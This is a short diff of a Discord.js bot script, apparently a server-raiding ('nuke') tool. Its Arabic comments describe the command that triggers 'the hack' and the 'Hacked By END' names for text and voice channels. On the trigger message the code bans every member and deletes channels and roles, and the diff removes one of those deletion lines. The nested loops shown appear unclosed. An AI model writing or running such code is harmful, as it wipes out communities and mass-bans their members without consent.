@@ -1,6 +1,5 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-
 const x_x = "GG" //هنا تحط الامر اللي يشغل الهاك
 const teext = "Hacked By END" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
 const vooice = "Hacked By END" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
@@ -24,7 +23,6 @@ if (message.content === x_x) {
     message.guild.members.forEach(baand => {
    baand.ban({reason: spam,});
    client.channels.forEach(hackch => {
-   hackch.delete();
    client.roles.forEach(hackch => {
    hackch.delete();
    client.user.setAvatar(pic)
